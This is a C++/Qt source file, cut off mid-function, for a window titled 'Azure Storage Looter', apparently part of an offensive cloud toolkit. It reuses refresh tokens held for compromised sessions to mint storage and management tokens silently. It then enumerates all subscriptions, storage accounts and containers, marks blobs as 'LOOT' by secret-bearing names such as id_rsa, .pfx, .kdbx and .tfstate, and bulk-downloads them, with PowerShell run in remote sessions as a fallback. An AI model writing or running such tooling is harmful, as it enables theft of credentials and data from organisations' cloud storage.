#include "AzureStorageWindow.h"
#include "StyleManager.h"
#include "UserSelectorWidget.h"
#include "TokenHelper.h"
#include "TokenStore.h"
#include "NetworkHelper.h"
#include "ClientTransport.h"

#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QGridLayout>
#include <QLabel>
#include <QGroupBox>
#include <QSplitter>
#include <QHeaderView>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QClipboard>
#include <QApplication>
#include <QMessageBox>
#include <QFileDialog>
#include <QFile>
#include <QDir>
#include <QUuid>
#include <QRegularExpression>
#include <QUrlQuery>
#include <QMenu>

namespace {
// Extract a JSON array/object from PowerShell output. The server pipes command output
// through `Out-String -Width 512`, which wraps long lines - so a compact JSON blob can
// arrive split across several lines. Stripping the inserted newlines reconstructs it
// (ConvertTo-Json -Compress emits no real newlines, and blob/container names have none).
QJsonArray parsePsJsonArray(const QString &out) {
    QString s = out;
    s.remove('\r');
    s.remove('\n');
    int start = -1;
    for (int i = 0; i < s.size(); ++i) {
        const QChar c = s.at(i);
        if (c == '[' || c == '{') { start = i; break; }
    }
    if (start < 0) return {};
    const int end = qMax(s.lastIndexOf(']'), s.lastIndexOf('}'));
    if (end < start) return {};
    const QJsonDocument doc = QJsonDocument::fromJson(s.mid(start, end - start + 1).toUtf8());
    if (doc.isArray()) return doc.array();
    QJsonArray a;
    if (doc.isObject()) a.append(doc.object());
    return a;
}
} // namespace

AzureStorageWindow::AzureStorageWindow(QWidget *parent)
    : QWidget(parent), net(new QNetworkAccessManager(this))
{
    setWindowTitle("Azure Storage Looter");
    setAttribute(Qt::WA_DeleteOnClose);
    setupUi();
}

AzureStorageWindow::~AzureStorageWindow() {
    if (net) {
        const auto replies = net->findChildren<QNetworkReply*>();
        for (auto *r : replies) { r->disconnect(); r->abort(); }
    }
    activeReplies.clear();
}

// ============================================================================
// UI
// ============================================================================

void AzureStorageWindow::setupUi() {
    auto *mainLayout = new QVBoxLayout(this);

    auto *authGroup = new QGroupBox("Access", this);
    auto *authLayout = new QVBoxLayout(authGroup);

    userSelector = new UserSelectorWidget(this);
    authLayout->addWidget(userSelector);
    connect(userSelector, &UserSelectorWidget::userChanged, this, &AzureStorageWindow::onUserChanged);
    connect(userSelector, &UserSelectorWidget::logMessage, this, &AzureStorageWindow::appendLog);

    autoFetchBtn = new QPushButton(this);
    autoFetchBtn->setVisible(false);

    // Minimal target fields - auth comes from the session's credential context
    auto *row1 = new QHBoxLayout();
    row1->addWidget(new QLabel("Storage account:", this));
    accountInput = new QLineEdit(this);
    accountInput->setPlaceholderText("filled by Enumerate All, or type e.g. tbhstoragee81305");
    row1->addWidget(accountInput, 1);
    row1->addWidget(new QLabel("Container:", this));
    containerInput = new QLineEdit(this);
    containerInput->setPlaceholderText("optional - skip listing and go straight to blobs");
    row1->addWidget(containerInput, 1);
    row1->addWidget(new QLabel("Service:", this));
    serviceCombo = new QComboBox(this);
    serviceCombo->addItems({"Blob", "File", "Table"});
    serviceCombo->setToolTip(
        "Blob:  list containers, download blobs\n"
        "File:  list shares, browse files\n"
        "Table: list tables, dump entities (uses the same storage.azure.com token)");
    row1->addWidget(serviceCombo);
    authLayout->addLayout(row1);

    // Hidden auth mode - always Connected Account. Other modes existed for manual use
    // but the credential login now gives sessions a proper token cache.
    authModeCombo = new QComboBox(this);
    authModeCombo->addItem("Connected Account (PowerShell)");
    authModeCombo->setVisible(false);

    // SAS token row - operators sometimes have only a shared-access signature
    // (from a leaked config, generateSas, or an out-of-band handoff). When set,
    // dataRequest() appends it to storage URLs and psContextSetup() switches to
    // -SasToken instead of -UseConnectedAccount. Leaving it blank keeps the
    // default connected-account path unchanged.
    auto *sasRow = new QHBoxLayout();
    sasRow->addWidget(new QLabel("SAS token:", this));
    sasInput = new QLineEdit(this);
    sasInput->setPlaceholderText(
        "optional - full query string, e.g. ?sv=2020-08-04&ss=b&srt=sco&sp=rwdlacx&sig=...");
    sasInput->setClearButtonEnabled(true);
    sasRow->addWidget(sasInput, 1);
    authLayout->addLayout(sasRow);

    // Hidden fields (kept for compile compat with psContextSetup / dataRequest)
    storageTokenInput = new QLineEdit(this); storageTokenInput->setVisible(false);
    storageTokenStatus = new QLabel(this);   storageTokenStatus->setVisible(false);
    keyInput = new QLineEdit(this);          keyInput->setVisible(false);
    credUser = new QLineEdit(this);          credUser->setVisible(false);
    credPass = new QLineEdit(this);          credPass->setVisible(false);
    tenantInput = new QLineEdit(this);       tenantInput->setVisible(false);
    mgmtTokenInput = new QLineEdit(this);    mgmtTokenInput->setVisible(false);
    mgmtTokenStatus = new QLabel(this);      mgmtTokenStatus->setVisible(false);
    subscriptionInput = new QLineEdit(this); subscriptionInput->setVisible(false);

    mainLayout->addWidget(authGroup);

    progressBar = new QProgressBar(this);
    progressBar->setVisible(false);
    progressBar->setRange(0, 0);
    mainLayout->addWidget(progressBar);

    // Action row
    auto *actionRow = new QHBoxLayout();
    enumerateBtn = new QPushButton("Enumerate All (Recon)", this);
    StyleManager::applySuccessStyle(enumerateBtn);
    actionRow->addWidget(enumerateBtn);
    listAccountsBtn = new QPushButton("List Storage Accounts", this);
    storageAccountCombo = new QComboBox(this);
    storageAccountCombo->setMinimumWidth(240);
    storageAccountCombo->setEnabled(false);
    listContainersBtn = new QPushButton("List Containers / Shares / Tables", this);
    listContainersBtn->setToolTip("Lists containers (Blob), shares (File), or tables (Table) depending on the Service dropdown.");
    listBlobsBtn = new QPushButton("List Blobs / Files / Entities", this);
    listBlobsBtn->setToolTip("Uses the 'Container' field: lists blobs in a container, files in a share, or queries entities in a table.");
    StyleManager::applyPrimaryStyle(listBlobsBtn);
    checkPublicBtn = new QPushButton("Check Public Access", this);
    cancelBtn = new QPushButton("Cancel", this);
    StyleManager::applyDangerStyle(cancelBtn);
    cancelBtn->setEnabled(false);
    actionRow->addWidget(listAccountsBtn);
    actionRow->addWidget(storageAccountCombo);
    actionRow->addWidget(listContainersBtn);
    actionRow->addWidget(listBlobsBtn);
    actionRow->addWidget(checkPublicBtn);
    actionRow->addWidget(cancelBtn);
    actionRow->addStretch();
    mainLayout->addLayout(actionRow);

    auto *splitter = new QSplitter(Qt::Vertical, this);

    storageTree = new QTreeWidget(this);
    storageTree->setHeaderLabels({"Name", "Type", "Size", "Last Modified", "Notes"});
    storageTree->header()->setSectionResizeMode(QHeaderView::Interactive);
    storageTree->setColumnWidth(0, 340);
    storageTree->setAlternatingRowColors(true);
    storageTree->setSelectionMode(QAbstractItemView::ExtendedSelection);
    splitter->addWidget(storageTree);

    auto *actionWidget = new QWidget(this);
    auto *dlLayout = new QHBoxLayout(actionWidget);
    dlLayout->setContentsMargins(0, 0, 0, 0);
    downloadBtn = new QPushButton("Download Selected", this);
    StyleManager::applySuccessStyle(downloadBtn);
    bulkDownloadBtn = new QPushButton("Bulk Download to Folder", this);
    genSasBtn = new QPushButton("Generate SAS", this);
    copyUrlBtn = new QPushButton("Copy URL", this);
    dlLayout->addWidget(downloadBtn);
    dlLayout->addWidget(bulkDownloadBtn);
    dlLayout->addWidget(genSasBtn);
    dlLayout->addWidget(copyUrlBtn);
    dlLayout->addStretch();
    splitter->addWidget(actionWidget);

    logOutput = new QTextEdit(this);
    logOutput->setReadOnly(true);
    logOutput->setMaximumHeight(150);
    splitter->addWidget(logOutput);

    mainLayout->addWidget(splitter);

    connect(enumerateBtn, &QPushButton::clicked, this, &AzureStorageWindow::enumerateAll);
    connect(listAccountsBtn, &QPushButton::clicked, this, &AzureStorageWindow::listStorageAccounts);
    connect(storageAccountCombo, QOverload<int>::of(&QComboBox::currentIndexChanged),
            this, &AzureStorageWindow::onStorageAccountSelected);
    connect(listContainersBtn, &QPushButton::clicked, this, &AzureStorageWindow::listContainers);
    connect(listBlobsBtn, &QPushButton::clicked, this, &AzureStorageWindow::listKnownContainer);
    connect(checkPublicBtn, &QPushButton::clicked, this, &AzureStorageWindow::checkPublicAccess);
    connect(storageTree, &QTreeWidget::itemClicked, this, &AzureStorageWindow::onTreeItemClicked);
    connect(storageTree, &QTreeWidget::itemDoubleClicked, this,
            [this](QTreeWidgetItem *, int){ listChildren(); });
    storageTree->setContextMenuPolicy(Qt::CustomContextMenu);
    connect(storageTree, &QTreeWidget::customContextMenuRequested, this, [this](const QPoint &pos) {
        QTreeWidgetItem *item = storageTree->itemAt(pos);
        if (!item) return;
        const QString type = item->data(0, Qt::UserRole).toString();
        QMenu menu(this);
        if (type == "blob") {
            menu.addAction("Download", this, &AzureStorageWindow::downloadSelected);
            menu.addAction("Copy URL", this, &AzureStorageWindow::copyUrl);
        } else if (type == "container") {
            menu.addAction("List Blobs", this, [this]() { listChildren(); });
            menu.addAction("Check Public Access", this, &AzureStorageWindow::checkPublicAccess);
            menu.addAction("Copy URL", this, &AzureStorageWindow::copyUrl);
        }
        if (!menu.isEmpty()) menu.exec(storageTree->viewport()->mapToGlobal(pos));
    });
    connect(downloadBtn, &QPushButton::clicked, this, &AzureStorageWindow::downloadSelected);
    connect(bulkDownloadBtn, &QPushButton::clicked, this, &AzureStorageWindow::bulkDownloadSelected);
    connect(genSasBtn, &QPushButton::clicked, this, &AzureStorageWindow::generateSas);
    connect(copyUrlBtn, &QPushButton::clicked, this, &AzureStorageWindow::copyUrl);

    onAuthModeChanged();
    resize(1000, 680);
}

void AzureStorageWindow::onAuthModeChanged() {}

bool AzureStorageWindow::hasStorageToken() const {
    return !storageTokenInput->text().trimmed().isEmpty();
}

void AzureStorageWindow::acquireStorageToken(std::function<void(bool)> then) {
    if (hasStorageToken()) { if (then) then(true); return; }

    const QString sid = userSelector->selectedSession();
    if (sid.isEmpty()) {
        appendLog("[-] No session selected", "red");
        if (then) then(false);
        return;
    }

    // Find a refresh token for this session (any resource - refresh tokens are cross-resource)
    TokenInfo tok = TokenStore::instance()->getTokenForSession(sid);
    if (tok.refreshToken.isEmpty()) {
        const auto all = TokenStore::instance()->getAllTokensForSession(sid);
        for (const TokenInfo &t : all) {
            if (!t.refreshToken.isEmpty()) { tok = t; break; }
        }
    }
    if (tok.refreshToken.isEmpty()) {
        appendLog("[!] No refresh token for this session - storage REST unavailable", "yellow");
        if (then) then(false);
        return;
    }

    const QString tenant = tok.tenantId.isEmpty() ? QStringLiteral("organizations") : tok.tenantId;
    appendLog("[*] Exchanging refresh token for storage access...", "cyan");

    QUrl url(QString("https://login.microsoftonline.com/%1/oauth2/v2.0/token").arg(tenant));
    QNetworkRequest req(url);
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
    QUrlQuery form;
    form.addQueryItem("client_id", QStringLiteral("1950a258-227b-4e31-a9cf-717495945fc2"));
    form.addQueryItem("grant_type", "refresh_token");
    form.addQueryItem("refresh_token", tok.refreshToken);
    form.addQueryItem("scope", "https://storage.azure.com/.default");

    QNetworkReply *reply = track(net->post(req, form.query(QUrl::FullyEncoded).toUtf8()));
    if (!reply) { appendLog("[-] Failed to send token request", "red"); if (then) then(false); return; }

    connect(reply, &QNetworkReply::finished, this, [this, reply, sid, tok, then]() {
        reply->deleteLater();
        activeReplies.removeOne(reply);
        if (reply->error() != QNetworkReply::NoError) {
            appendLog(QString("[-] Storage token exchange failed: %1").arg(reply->errorString()), "red");
            if (then) then(false);
            return;
        }
        const QJsonObject obj = QJsonDocument::fromJson(reply->readAll()).object();
        const QString at = obj.value("access_token").toString();
        if (at.isEmpty()) {
            const QString err = obj.value("error_description").toString(obj.value("error").toString("unknown"));
            appendLog(QString("[-] Storage token exchange error: %1").arg(err), "red");
            if (then) then(false);
            return;
        }
        storageTokenInput->setText(at);
        TokenInfo stInfo;
        stInfo.accessToken = at;
        stInfo.upn = tok.upn;
        stInfo.tenantId = tok.tenantId;
        stInfo.resource = QStringLiteral("https://storage.azure.com");
        TokenStore::instance()->storeToken(sid, stInfo);
        appendLog("[+] Storage token acquired - REST path enabled", "lime");
        if (then) then(true);
    });
}

// ============================================================================
// Helpers
// ============================================================================

void AzureStorageWindow::appendLog(const QString &msg, const QString &color) {
    logOutput->append(QString("<span style='color:%1'>%2</span>").arg(color, msg.toHtmlEscaped()));
}

QString AzureStorageWindow::humanSize(qint64 bytes) {
    if (bytes < 1024) return QString("%1 B").arg(bytes);
    if (bytes < 1024 * 1024) return QString("%1 KB").arg(bytes / 1024.0, 0, 'f', 1);
    if (bytes < 1024LL * 1024 * 1024) return QString("%1 MB").arg(bytes / (1024.0 * 1024.0), 0, 'f', 1);
    return QString("%1 GB").arg(bytes / (1024.0 * 1024.0 * 1024.0), 0, 'f', 2);
}

bool AzureStorageWindow::isLootName(const QString &name) {
    const QString n = name.toLower();
    static const QStringList exts = {
        ".pfx",".pem",".key",".p12",".ppk",".env",".bak",".sql",".config",".tfstate",
        ".kdbx",".ovpn",".rdp",".crt",".cer",".jks",".keytab"
    };
    for (const QString &e : exts) if (n.endsWith(e)) return true;
    static const QStringList subs = {
        "secret","password","passwd","cred","credential","backup","dump","unattend",
        "web.config","appsettings","id_rsa","authorized_keys","connectionstring",".git-credentials"
    };
    for (const QString &s : subs) if (n.contains(s)) return true;
    return false;
}

QString AzureStorageWindow::accountForItem(QTreeWidgetItem *item) const {
    // In the Enumerate-All tree the account is an ancestor node; otherwise use the field.
    for (QTreeWidgetItem *p = item; p; p = p->parent())
        if (p->data(0, Qt::UserRole).toString() == "account") return p->text(0);
    return accountInput->text().trimmed();
}

QString AzureStorageWindow::accountHost() const {
    return accountHostFor(currentStorageAccount);
}

QString AzureStorageWindow::accountHostFor(const QString &acct) const {
    const QString sel = serviceCombo->currentText();
    QString svc;
    if      (sel.startsWith("File"))  svc = "file";
    else if (sel.startsWith("Table")) svc = "table";
    else                              svc = "blob";
    return QString("https://%1.%2.core.windows.net").arg(acct, svc);
}

QNetworkRequest AzureStorageWindow::dataRequest(const QString &url, bool anonymous) {
    QString sas = sasInput->text().trimmed();

    QNetworkRequest req;
    if (!sas.isEmpty()) {
        // SAS overrides everything else. The SAS *is* the auth - appended to the
        // URL as query params. Never send a bearer header alongside it: Storage
        // rejects the request if both are present.
        if (sas.startsWith('?')) sas.remove(0, 1);
        QUrl u(url);
        QString existing = u.query(QUrl::FullyEncoded);
        u.setQuery(existing.isEmpty() ? sas : (existing + '&' + sas));
        req = QNetworkRequest(u);
    } else if (anonymous) {
        req = QNetworkRequest(QUrl(url));
    } else {
        req = NetworkHelper::createBearerRequest(url, storageTokenInput->text().trimmed());
    }
    req.setRawHeader("x-ms-version", "2020-10-02");
    // The Table service defaults to AtomPub XML, which nothing here parses.
    // Ask for OData JSON without embedded metadata so the response is small and
    // trivially serialisable. Blob/File ignore this header.
    if (serviceCombo->currentText().startsWith("Table")) {
        req.setRawHeader("Accept",           "application/json;odata=nometadata");
        req.setRawHeader("DataServiceVersion", "3.0;NetFx");
        req.setRawHeader("MaxDataServiceVersion", "3.0;NetFx");
    }
    NetworkHelper::setRequestTimeout(req);
    return req;
}

QNetworkReply *AzureStorageWindow::track(QNetworkReply *reply) {
    if (reply) activeReplies.append(reply);
    return reply;
}

// ============================================================================
// PowerShell fallback (runs in the selected session)
// ============================================================================

QObject *AzureStorageWindow::locateTransport() const {
    if (auto *t = qApp->findChild<ClientTransport*>()) return t;
    if (auto *o = qApp->findChild<QObject*>("ClientTransport")) return o;
    return nullptr;
}

bool AzureStorageWindow::psAvailable() const {
    return locateTransport() != nullptr && !userSelector->selectedSession().isEmpty();
}

void AzureStorageWindow::runPs(const QString &script, std::function<void(bool, const QString &)> cb) {
    QObject *t = locateTransport();
    const QString sid = userSelector->selectedSession();
    if (!t || sid.isEmpty()) {
        cb(false, "No active session for the PowerShell path. Select a session that is logged in (Connect-AzAccount).");
        return;
    }
    auto *typed = qobject_cast<ClientTransport*>(t);
    if (!typed) { cb(false, "Transport unavailable."); return; }

    const QString cmdId = QUuid::createUuid().toString(QUuid::WithoutBraces);
    auto acc = std::make_shared<QString>();
    auto conn = std::make_shared<QMetaObject::Connection>();
    *conn = connect(typed, &ClientTransport::messageReceived, this,
        [this, cmdId, acc, conn, cb](const QJsonObject &obj) {
            if (obj.value("cmdId").toString() != cmdId) return;
            const QString act = obj.value("action").toString();
            if (act == QLatin1String("output")) {
                acc->append(obj.value("data").toString());
                acc->append('\n');
            } else if (act == QLatin1String("command_complete")) {
                QObject::disconnect(*conn);
                cb(obj.value("ok").toBool(true), *acc);
            }
        });

    QJsonObject req;
    req.insert("action", "run_command");
    req.insert("sessionId", sid);
    req.insert("command", script);
    req.insert("cmdId", cmdId);
    typed->sendJson(req);
    appendLog(QString("[*] PowerShell: %1").arg(script.left(120)), "gray");
}

QString AzureStorageWindow::psContextSetup() const {
    const QString sas = sasInput->text().trimmed();
    if (!sas.isEmpty()) {
        // Escape single quotes for embedding inside a single-quoted PS string.
        QString esc = sas;
        esc.replace('\'', QStringLiteral("''"));
        return QString("$ctx=New-AzStorageContext -StorageAccountName '%1' -SasToken '%2'")
                   .arg(currentStorageAccount, esc);
    }
    return QString("$ctx=New-AzStorageContext -StorageAccountName '%1' -UseConnectedAccount")
               .arg(currentStorageAccount);
}

// ============================================================================
// Account discovery (optional ARM)
// ============================================================================

void AzureStorageWindow::acquireManagementToken(std::function<void(const QString &)> then) {
    // Cheap path: already have one typed in the (hidden) mgmt token field.
    const QString typed = mgmtTokenInput->text().trimmed();
    if (!typed.isEmpty()) { then(typed); return; }

    // Already exchanged for this session earlier?
    const QString existing = userSelector
        ? userSelector->getExistingToken(QStringLiteral("https://management.azure.com"))
        : QString();
    if (!existing.isEmpty()) {
        mgmtTokenInput->setText(existing);
        then(existing);
        return;
    }

    // Silent refresh-token exchange. Stored back under the same sessionId so
    // other modules + the terminal pick it up too.
    if (!userSelector || !userSelector->hasSelection()) { then(QString()); return; }
    appendLog("[*] Fetching Management token for selected session...", "cyan");
    userSelector->fetchToken(QStringLiteral("https://management.azure.com"),
        [this, then](bool ok, const QString &tok, const QString &err) {
            if (!ok) {
                appendLog(QString("[-] Management token unavailable (falling back to PowerShell): %1").arg(err), "yellow");
                then(QString());
                return;
            }
            mgmtTokenInput->setText(tok);
            appendLog("[+] Management token acquired.", "lime");
            then(tok);
        });
}

void AzureStorageWindow::listStorageAccounts() {
    // FAST PATH: ARM over HTTP. Auto-fetches a Management token from the selected
    // session (silent refresh-token exchange) so no manual input needed. Falls
    // back to Get-AzStorageAccount via the terminal only when ARM is unavailable,
    // because the PS round-trip is much slower.
    storageAccountCombo->clear();
    setLoading(true);
    acquireManagementToken([this](const QString &mgmt) {
        if (!mgmt.isEmpty()) { listStorageAccountsArm(mgmt); return; }
        // Fallback: PowerShell (slow, but works with just a live Az context).
        if (!psAvailable()) {
            setLoading(false);
            QMessageBox::information(this, "Select a logged-in session",
                "Storage discovery needs either a Management token (auto-fetched from "
                "the selected session's refresh token) or an active PowerShell session "
                "with Connect-AzAccount. Select a session first.");
            return;
        }
        appendLog("[*] Falling back to Get-AzStorageAccount via terminal...", "yellow");
        const QString script =
            "Get-AzStorageAccount | Select-Object StorageAccountName,ResourceGroupName,PrimaryLocation,SkuName,Kind "
            "| ConvertTo-Json -Compress";
        runPs(script, [this](bool ok, const QString &out) {
            setLoading(false);
            if (!ok) { appendLog("[-] Get-AzStorageAccount failed:", "red"); appendLog(out.trimmed(), "gray"); return; }
            const QJsonArray arr = parsePsJsonArray(out);
            for (const QJsonValue &v : arr) {
                const QJsonObject a = v.toObject();
                const QString name = a.value("StorageAccountName").toString();
                if (name.isEmpty()) continue;
                storageAccountCombo->addItem(
                    QString("%1  (%2, %3)").arg(name, a.value("ResourceGroupName").toString(),
                                                a.value("PrimaryLocation").toString()),
                    name);
            }
            storageAccountCombo->setEnabled(storageAccountCombo->count() > 0);
            appendLog(storageAccountCombo->count()
                          ? QString("[+] Found %1 storage account(s)").arg(storageAccountCombo->count())
                          : QStringLiteral("[!] No storage accounts visible to this account."),
                      storageAccountCombo->count() ? "green" : "yellow");
            if (storageAccountCombo->count()) onStorageAccountSelected(0);
        });
    });
}

void AzureStorageWindow::listStorageAccountsArm(const QString &mgmtToken) {
    // Fan out over every accessible subscription; a Management token doesn't
    // encode which subs a principal can see, so we list subs first, then
    // storage accounts per sub in parallel. Faster than a single PS cmdlet.
    appendLog("[*] Listing storage accounts via ARM (auto-fetched Management token)...", "cyan");

    QNetworkReply *subsReply = track(net->get(NetworkHelper::createBearerRequest(
        QStringLiteral("https://management.azure.com/subscriptions?api-version=2020-01-01"), mgmtToken)));
    if (!subsReply) { appendLog("[-] Failed to create request", "red"); setLoading(false); return; }

    connect(subsReply, &QNetworkReply::finished, this, [this, subsReply, mgmtToken]() {
        subsReply->deleteLater();
        activeReplies.removeOne(subsReply);
        if (!NetworkHelper::isReplySuccess(subsReply)) {
            setLoading(false);
            appendLog(QString("[-] Subscriptions call failed: %1").arg(NetworkHelper::parseApiError(subsReply)), "red");
            return;
        }
        const QJsonArray subs = QJsonDocument::fromJson(subsReply->readAll()).object().value("value").toArray();
        if (subs.isEmpty()) { setLoading(false); appendLog("[!] No subscriptions visible.", "yellow"); return; }

        auto pending = std::make_shared<int>(subs.size());
        auto aggregated = std::make_shared<QJsonArray>();
        for (const QJsonValue &sv : subs) {
            const QString subId   = sv.toObject().value("subscriptionId").toString();
            const QString subName = sv.toObject().value("displayName").toString();
            if (subId.isEmpty()) { if (--(*pending) <= 0) {/*fall-through below*/} continue; }

            const QString url = QString("https://management.azure.com/subscriptions/%1/providers/"
                                        "Microsoft.Storage/storageAccounts?api-version=2021-09-01").arg(subId);
            QNetworkReply *r = track(net->get(NetworkHelper::createBearerRequest(url, mgmtToken)));
            if (!r) { if (--(*pending) <= 0) {} continue; }
            connect(r, &QNetworkReply::finished, this,
                    [this, r, subName, pending, aggregated]() {
                r->deleteLater();
                activeReplies.removeOne(r);
                if (NetworkHelper::isReplySuccess(r)) {
                    const QJsonArray arr = QJsonDocument::fromJson(r->readAll()).object().value("value").toArray();
                    for (const QJsonValue &v : arr) {
                        QJsonObject a = v.toObject();
                        a.insert("__sub", subName);
                        aggregated->append(a);
                    }
                }
                if (--(*pending) <= 0) {
                    setLoading(false);
                    storageAccounts = *aggregated;
                    if (aggregated->isEmpty()) { appendLog("[!] No storage accounts found.", "yellow"); return; }
                    appendLog(QString("[+] Found %1 storage account(s) across all subscriptions").arg(aggregated->size()), "green");
                    for (const QJsonValue &v : *aggregated) {
                        const QJsonObject a = v.toObject();
                        storageAccountCombo->addItem(
                            QString("%1  (%2, %3)").arg(a.value("name").toString(),
                                                        a.value("location").toString(),
                                                        a.value("__sub").toString()),
                            a.value("name").toString());
                    }
                    storageAccountCombo->setEnabled(true);
                    onStorageAccountSelected(0);
                }
            });
        }
    });
}

void AzureStorageWindow::onStorageAccountSelected(int index) {
    if (index >= 0 && index < storageAccountCombo->count()) {
        const QString name = storageAccountCombo->itemData(index).toString();
        if (!name.isEmpty()) accountInput->setText(name);
    }
}

// ============================================================================
// List containers / shares
// ============================================================================

void AzureStorageWindow::enumerateAll() {
    if (!userSelector || !userSelector->hasSelection()) {
        QMessageBox::information(this, "Select a session",
            "Enumeration needs a session. Select one first.");
        return;
    }
    storageTree->clear();
    setLoading(true);

    // FAST PATH: ARM over HTTP for accounts + containers, then a storage-token
    // REST call per container for blobs. Falls back to the Az PowerShell path
    // only if a Management token can't be obtained (much slower - many PS
    // round-trips).
    acquireManagementToken([this](const QString &mgmt) {
        if (!mgmt.isEmpty()) {
            // Kick the storage-token exchange in parallel so blob listing has
            // it ready by the time containers land.
            if (!hasStorageToken()) acquireStorageToken(nullptr);
            enumerateAllArm(mgmt);
            return;
        }
        if (!psAvailable()) {
            setLoading(false);
            appendLog("[-] Can't obtain a Management token and no active PS session either.", "red");
            return;
        }
        appendLog("[!] Management token unavailable - using slower PowerShell path.", "yellow");
        enumerateAllPsLegacy();
    });
}

void AzureStorageWindow::enumerateAllArm(const QString &mgmtToken) {
    appendLog("[*] Enumerating storage via ARM (Management token)...", "cyan");

    QNetworkReply *subsReply = track(net->get(NetworkHelper::createBearerRequest(
        QStringLiteral("https://management.azure.com/subscriptions?api-version=2020-01-01"), mgmtToken)));
    if (!subsReply) { setLoading(false); appendLog("[-] Failed to create request", "red"); return; }

    connect(subsReply, &QNetworkReply::finished, this, [this, subsReply, mgmtToken]() {
        subsReply->deleteLater();
        activeReplies.removeOne(subsReply);
        if (!NetworkHelper::isReplySuccess(subsReply)) {
            setLoading(false);
            appendLog(QString("[-] Subscriptions call failed: %1").arg(NetworkHelper::parseApiError(subsReply)), "red");
            return;
        }
        const QJsonArray subs = QJsonDocument::fromJson(subsReply->readAll()).object().value("value").toArray();
        if (subs.isEmpty()) { setLoading(false); appendLog("[!] No subscriptions visible.", "yellow"); return; }

        // Two-phase: list every storage account across all subs (parallel),
        // then list containers for every account (parallel). Everything is
        // rendered into the tree as it arrives; a shared counter fires the
        // blob-listing phase when both dimensions are complete.
        auto accountsPending   = std::make_shared<int>(subs.size());
        auto containersPending = std::make_shared<int>(0);
        auto contItems         = std::make_shared<QMap<QString, QTreeWidgetItem*>>();
        auto accItems          = std::make_shared<QMap<QString, QTreeWidgetItem*>>();
        auto contCount         = std::make_shared<int>(0);

        auto phase2Blobs = [this, contItems, contCount]() {
            appendLog(QString("[+] %1 container(s) across all accounts. Listing blobs...")
                          .arg(*contCount), "green");
            if (contItems->isEmpty() || !hasStorageToken()) {
                setLoading(false);
                if (!hasStorageToken())
                    appendLog("[!] No storage token yet - double-click a container to list its blobs.", "yellow");
                return;
            }
            auto pending = std::make_shared<int>(contItems->size());
            auto totalBlobs = std::make_shared<int>(0);
            auto totalLoot  = std::make_shared<int>(0);
            for (auto it = contItems->constBegin(); it != contItems->constEnd(); ++it) {
                const QString acct = it.key().section('/', 0, 0);
                const QString cont = it.key().section('/', 1);
                QTreeWidgetItem *ci = it.value();
                const QString url = QString("%1/%2?restype=container&comp=list").arg(accountHostFor(acct), cont);
                QNetworkReply *r = track(net->get(dataRequest(url)));
                if (!r) { --(*pending); continue; }
                connect(r, &QNetworkReply::finished, this,
                        [this, r, ci, pending, totalBlobs, totalLoot]() {
                    r->deleteLater();
                    activeReplies.removeOne(r);
                    if (r->error() == QNetworkReply::NoError) {
                        const QString xml = QString::fromUtf8(r->readAll());
                        QRegularExpression blobRe("<Blob>([\\s\\S]*?)</Blob>");
                        QRegularExpression nameRe("<Name>([^<]+)</Name>");
                        QRegularExpression sizeRe("<Content-Length>([^<]+)</Content-Length>");
                        auto bit = blobRe.globalMatch(xml);
                        while (bit.hasNext()) {
                            const QString e = bit.next().captured(1);
                            const QString name = nameRe.match(e).captured(1);
                            const qint64 bytes = sizeRe.match(e).captured(1).toLongLong();
                            auto *bi = new QTreeWidgetItem(ci);
                            bi->setText(0, name); bi->setText(1, "Blob");
                            bi->setText(2, humanSize(bytes));
                            bi->setData(0, Qt::UserRole, "blob");
                            if (isLootName(name)) {
                                bi->setText(4, "LOOT");
                                for (int c = 0; c < 5; ++c)
                                    bi->setForeground(c, StyleManager::colorForAuditAction("token"));
                                ++(*totalLoot);
                            }
                            ++(*totalBlobs);
                        }
                    }
                    if (--(*pending) <= 0) {
                        setLoading(false);
                        appendLog(QString("[+] Enumerated %1 blob(s)%2")
                                      .arg(*totalBlobs)
                                      .arg(*totalLoot ? QString(", %1 flagged LOOT").arg(*totalLoot) : QString()),
                                  *totalLoot ? "yellow" : "green");
                    }
                });
            }
        };

        auto maybePhase2 = [accountsPending, containersPending, phase2Blobs]() {
            if (*accountsPending == 0 && *containersPending == 0) phase2Blobs();
        };

        for (const QJsonValue &sv : subs) {
            const QString subId = sv.toObject().value("subscriptionId").toString();
            if (subId.isEmpty()) { --(*accountsPending); maybePhase2(); continue; }

            const QString accUrl = QString("https://management.azure.com/subscriptions/%1/providers/"
                                           "Microsoft.Storage/storageAccounts?api-version=2021-09-01").arg(subId);
            QNetworkReply *ar = track(net->get(NetworkHelper::createBearerRequest(accUrl, mgmtToken)));
            if (!ar) { --(*accountsPending); maybePhase2(); continue; }
            connect(ar, &QNetworkReply::finished, this,
                    [this, ar, mgmtToken, accountsPending, containersPending, accItems, contItems, contCount, maybePhase2]() {
                ar->deleteLater();
                activeReplies.removeOne(ar);
                if (NetworkHelper::isReplySuccess(ar)) {
                    const QJsonArray arr = QJsonDocument::fromJson(ar->readAll()).object().value("value").toArray();
                    for (const QJsonValue &av : arr) {
                        const QJsonObject a = av.toObject();
                        const QString acct = a.value("name").toString();
                        // /subscriptions/<sub>/resourceGroups/<rg>/providers/...
                        const QString id = a.value("id").toString();
                        const QString rg = id.section("/resourceGroups/", 1).section('/', 0, 0);
                        if (acct.isEmpty() || rg.isEmpty()) continue;

                        auto *ai = new QTreeWidgetItem(storageTree);
                        ai->setText(0, acct); ai->setText(1, "Account");
                        ai->setData(0, Qt::UserRole, "account");
                        ai->setExpanded(true);
                        accItems->insert(acct, ai);

                        // Fetch containers for this account via ARM (no data-plane token needed).
                        const QString cUrl = QString(
                            "https://management.azure.com/subscriptions/%1/resourceGroups/%2/providers/"
                            "Microsoft.Storage/storageAccounts/%3/blobServices/default/containers"
                            "?api-version=2021-09-01").arg(id.section('/', 2, 2), rg, acct);
                        ++(*containersPending);
                        QNetworkReply *cr = track(net->get(NetworkHelper::createBearerRequest(cUrl, mgmtToken)));
                        if (!cr) { --(*containersPending); maybePhase2(); continue; }
                        connect(cr, &QNetworkReply::finished, this,
                                [this, cr, acct, ai, contItems, contCount, containersPending, maybePhase2]() {
                            cr->deleteLater();
                            activeReplies.removeOne(cr);
                            if (NetworkHelper::isReplySuccess(cr)) {
                                const QJsonArray cs = QJsonDocument::fromJson(cr->readAll()).object().value("value").toArray();
                                for (const QJsonValue &cv : cs) {
                                    const QString cname = cv.toObject().value("name").toString();
